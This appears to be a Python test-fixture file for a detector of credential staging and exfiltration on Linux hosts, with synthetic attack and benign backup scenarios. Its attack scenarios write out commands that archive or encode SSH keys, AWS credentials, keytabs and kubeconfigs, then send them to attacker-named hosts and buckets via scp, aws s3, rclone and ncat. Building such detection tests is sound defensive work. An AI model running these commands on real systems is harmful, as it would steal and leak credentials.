import sys
import time
from pathlib import Path
from typing import List

sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from core.normalize import NormalizedEvent

from tests.coverage.credential_access_helper import CoverageScenario


def _proc_evt(
    ts,
    cmdline,
    *,
    host="archive-host",
    user="alice",
    process=None,
    source="journald",
    action="process_exec",
    outcome="success",
    fields=None,
    distro_family="unknown",
):
    merged_fields = {"cmdline": cmdline}
    if fields:
        merged_fields.update(fields)
    return NormalizedEvent(
        ts=ts,
        host=host,
        source=source,
        category="process",
        action=action,
        outcome=outcome,
        user=user,
        process=process or cmdline.split()[0],
        message=cmdline,
        fields=merged_fields,
        distro_family=distro_family,
    )


def build_attack_scenarios() -> List[CoverageScenario]:
    now = time.time()
    return [
        CoverageScenario(
            name="tar-temp-stage-etc-ssh",
            events=[_proc_evt(now + 1, "tar czf /tmp/etc-ssh.tgz /etc/ssh /home/alice/.aws/credentials", host="archive-attack-01", process="tar")],
            expected_ids={"PROC-EXFIL-001"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="zip-vartmp-stage-env",
            events=[_proc_evt(now + 2, "zip -r /var/tmp/app.zip /srv/app/.env /home/alice/.aws/credentials", host="archive-attack-02", process="zip")],
            expected_ids={"PROC-EXFIL-001"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="7z-devshm-kube-stage",
            events=[_proc_evt(now + 3, "7z a /dev/shm/kube.7z /etc/kubernetes/admin.conf", host="archive-attack-03", process="7z")],
            expected_ids={"PROC-EXFIL-001"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="gzip-keytab-stage",
            events=[_proc_evt(now + 4, "gzip -c /etc/krb5.keytab > /tmp/krb5.keytab.gz", host="archive-attack-04", user="root", process="gzip")],
            expected_ids={"PROC-EXFIL-001"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="xz-private-key-stage",
            events=[_proc_evt(now + 5, "xz -z -c /etc/ssl/private/server.key > /var/tmp/server.key.xz", host="archive-attack-05", user="root", process="xz")],
            expected_ids={"PROC-EXFIL-001"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="openssl-enc-ssh-key-stage",
            events=[_proc_evt(now + 6, "openssl enc -aes-256-cbc -in /etc/ssh/ssh_host_rsa_key -out /tmp/ssh.enc -k secret", host="archive-attack-06", user="root", process="openssl")],
            expected_ids={"PROC-EXFIL-001"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="gpg-pgpass-stage",
            events=[_proc_evt(now + 7, "gpg -c /home/alice/.pgpass -o /dev/shm/db.gpg", host="archive-attack-07", process="gpg")],
            expected_ids={"PROC-EXFIL-001"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="split-kubelet-stage",
            events=[_proc_evt(now + 8, "split -b 50k /var/lib/kubelet/config.yaml /tmp/kube.part.", host="archive-attack-08", user="root", process="split")],
            expected_ids={"PROC-EXFIL-001"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="base64-env-stage",
            events=[_proc_evt(now + 9, "base64 /srv/app/.env > /tmp/env.b64", host="archive-attack-09", process="base64")],
            expected_ids={"PROC-EXFIL-001"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="debian-apt-auth-stage",
            events=[_proc_evt(now + 9.1, "tar czf /tmp/apt-auth.tgz /etc/apt/auth.conf", host="archive-attack-09b", user="root", process="tar", distro_family="debian")],
            expected_ids={"PROC-EXFIL-001"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="rhel-rhsm-stage",
            events=[_proc_evt(now + 9.2, "gpg -c /etc/rhsm/rhsm.conf -o /tmp/rhsm.gpg", host="archive-attack-09c", user="root", process="gpg", distro_family="rhel")],
            expected_ids={"PROC-EXFIL-001"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="suse-zypp-credentials-stage",
            events=[_proc_evt(now + 9.3, "zip -r /tmp/zypp-creds.zip /etc/zypp/credentials.d", host="archive-attack-09d", user="root", process="zip", distro_family="suse")],
            expected_ids={"PROC-EXFIL-001"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="temp-scp-transfer",
            events=[_proc_evt(now + 10, "scp /tmp/loot.tgz attacker@198.51.100.20:/tmp/loot.tgz", host="archive-attack-10", process="scp")],
            expected_ids={"PROC-EXFIL-002"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="temp-rclone-transfer",
            events=[_proc_evt(now + 11, "rclone copy /var/tmp/cloud.tgz remote:loot", host="archive-attack-11", process="rclone")],
            expected_ids={"PROC-EXFIL-002"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="temp-aws-s3-transfer",
            events=[_proc_evt(now + 12, "aws s3 cp /dev/shm/loot.tgz s3://attacker-bucket/loot.tgz", host="archive-attack-12", process="aws")],
            expected_ids={"PROC-EXFIL-002"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="temp-ncat-transfer",
            events=[_proc_evt(now + 13, "ncat 198.51.100.30 4444 < /tmp/loot.bin", host="archive-attack-13", process="ncat")],
            expected_ids={"PROC-EXFIL-002"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="zip-then-scp-sequence",
            events=[
                _proc_evt(now + 14, "zip -r /tmp/cloud.zip /srv/app/.env /home/alice/.aws/credentials", host="archive-attack-14", process="zip"),
                _proc_evt(now + 19, "scp /tmp/cloud.zip attacker@198.51.100.92:/tmp/cloud.zip", host="archive-attack-14", process="scp"),
            ],
            expected_ids={"PROC-EXFIL-001", "PROC-EXFIL-002", "SEQ-045"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="gpg-then-aws-sequence",
            events=[
                _proc_evt(now + 20, "gpg -c /home/alice/.pgpass -o /tmp/db.gpg", host="archive-attack-15", process="gpg"),
                _proc_evt(now + 25, "aws s3 cp /tmp/db.gpg s3://attacker-bucket/db.gpg", host="archive-attack-15", process="aws"),
            ],
            expected_ids={"PROC-EXFIL-001", "PROC-EXFIL-002", "SEQ-045"},
            forbidden_ids=set(),
            kind="attack",
        ),
    ]


def build_benign_scenarios() -> List[CoverageScenario]:
    now = time.time()
    return [
        CoverageScenario(
            name="backup-archive-var-backups",
            events=[_proc_evt(now + 101, "tar czf /var/backups/etc-nightly.tgz /etc/ssh", host="archive-benign-01", user="root", process="tar")],
            expected_ids=set(),
            forbidden_ids={"PROC-EXFIL-001", "PROC-EXFIL-002", "SEQ-045"},
            kind="benign",
        ),
        CoverageScenario(
            name="rsnapshot-backup",
            events=[_proc_evt(now + 102, "rsnapshot sync /var/backups", host="archive-benign-02", user="root", process="rsnapshot")],
            expected_ids=set(),
            forbidden_ids={"PROC-EXFIL-001", "PROC-EXFIL-002", "SEQ-045"},
            kind="benign",
        ),
        CoverageScenario(
            name="borg-create-backup",
            events=[_proc_evt(now + 103, "borg create /var/backups/repo::node01 /etc/ssh", host="archive-benign-03", user="root", process="borg")],
            expected_ids=set(),
            forbidden_ids={"PROC-EXFIL-001", "PROC-EXFIL-002", "SEQ-045"},
            kind="benign",
        ),
        CoverageScenario(
            name="restic-backup",
            events=[_proc_evt(now + 104, "restic backup /var/backups", host="archive-benign-04", user="root", process="restic")],
            expected_ids=set(),
            forbidden_ids={"PROC-EXFIL-001", "PROC-EXFIL-002", "SEQ-045"},
            kind="benign",
        ),
        CoverageScenario(
            name="duplicity-backup",
            events=[_proc_evt(now + 105, "duplicity /var/backups file:///srv/backup/node01", host="archive-benign-05", user="root", process="duplicity")],
            expected_ids=set(),
            forbidden_ids={"PROC-EXFIL-001", "PROC-EXFIL-002", "SEQ-045"},
            kind="benign",
        ),
        CoverageScenario(
            name="aws-sync-admin",
            events=[_proc_evt(now + 106, "aws s3 sync /tmp/diag s3://corp-backup/diag --profile admin", host="archive-benign-06", user="root", process="aws")],
            expected_ids=set(),
            forbidden_ids={"PROC-EXFIL-001", "PROC-EXFIL-002", "SEQ-045"},
            kind="benign",
        ),
        CoverageScenario(
            name="aws-cp-backup-path",
            events=[_proc_evt(now + 107, "aws s3 cp /var/backups/nightly.tgz s3://corp-backup/nightly.tgz", host="archive-benign-07", user="root", process="aws")],
            expected_ids=set(),
            forbidden_ids={"PROC-EXFIL-001", "PROC-EXFIL-002", "SEQ-045"},
            kind="benign",
        ),
        CoverageScenario(
            name="healthcheck-download",
            events=[_proc_evt(now + 108, "curl -fsS http://127.0.0.1/healthz -o /tmp/health.txt", host="archive-benign-08", process="curl")],
            expected_ids=set(),
            forbidden_ids={"PROC-EXFIL-001", "PROC-EXFIL-002", "SEQ-045"},
            kind="benign",
        ),
        CoverageScenario(
            name="admin-rsync-backup",
            events=[_proc_evt(now + 109, "rsync /var/backups/etc-nightly.tgz backup@198.51.100.60:/srv/backup/", host="archive-benign-09", user="root", process="rsync")],
            expected_ids=set(),
            forbidden_ids={"PROC-EXFIL-001", "PROC-EXFIL-002", "SEQ-045"},
            kind="benign",
        ),
        CoverageScenario(
            name="ansible-backup-archive",
            events=[_proc_evt(now + 110, "ansible-playbook backup.yml --extra-vars archive=/tmp/diag.tgz", host="archive-benign-10", user="root", process="ansible-playbook")],
            expected_ids=set(),
            forbidden_ids={"PROC-EXFIL-001", "PROC-EXFIL-002", "SEQ-045"},
            kind="benign",
        ),
        CoverageScenario(
            name="debian-package-cache-sync",
            events=[_proc_evt(now + 111, "apt-get update && apt-get download openssh-server", host="archive-benign-11", user="root", process="apt-get", distro_family="debian")],
            expected_ids=set(),
            forbidden_ids={"PROC-EXFIL-001", "PROC-EXFIL-002", "SEQ-045"},
            kind="benign",
        ),
        CoverageScenario(
            name="debian-apport-upload",
            events=[_proc_evt(now + 111.1, "scp /tmp/apport.openssh-server.tar.gz support@198.51.100.70:/var/support/apport.openssh-server.tar.gz", host="archive-benign-11b", user="root", process="scp", distro_family="debian")],
            expected_ids=set(),
            forbidden_ids={"PROC-EXFIL-001", "PROC-EXFIL-002", "SEQ-045"},
            kind="benign",
        ),
        CoverageScenario(
            name="rhel-subscription-manager-refresh",
            events=[_proc_evt(now + 112, "subscription-manager refresh", host="archive-benign-12", user="root", process="subscription-manager", distro_family="rhel")],
            expected_ids=set(),
            forbidden_ids={"PROC-EXFIL-001", "PROC-EXFIL-002", "SEQ-045"},
            kind="benign",
        ),
        CoverageScenario(
            name="rhel-sosreport-upload",
            events=[_proc_evt(now + 112.1, "scp /tmp/sosreport-node01-20260414.tar.xz support@198.51.100.71:/var/support/sosreport-node01-20260414.tar.xz", host="archive-benign-12b", user="root", process="scp", distro_family="rhel")],
            expected_ids=set(),
            forbidden_ids={"PROC-EXFIL-001", "PROC-EXFIL-002", "SEQ-045"},
            kind="benign",
        ),
        CoverageScenario(
            name="suse-zypper-refresh",
            events=[_proc_evt(now + 113, "zypper refresh", host="archive-benign-13", user="root", process="zypper", distro_family="suse")],
            expected_ids=set(),
            forbidden_ids={"PROC-EXFIL-001", "PROC-EXFIL-002", "SEQ-045"},
            kind="benign",
        ),
        CoverageScenario(
            name="suse-supportconfig-upload",
            events=[_proc_evt(now + 113.1, "scp /tmp/supportconfig-node01.txz support@198.51.100.72:/var/support/supportconfig-node01.txz", host="archive-benign-13b", user="root", process="scp", distro_family="suse")],
            expected_ids=set(),
            forbidden_ids={"PROC-EXFIL-001", "PROC-EXFIL-002", "SEQ-045"},
            kind="benign",
        ),
    ]
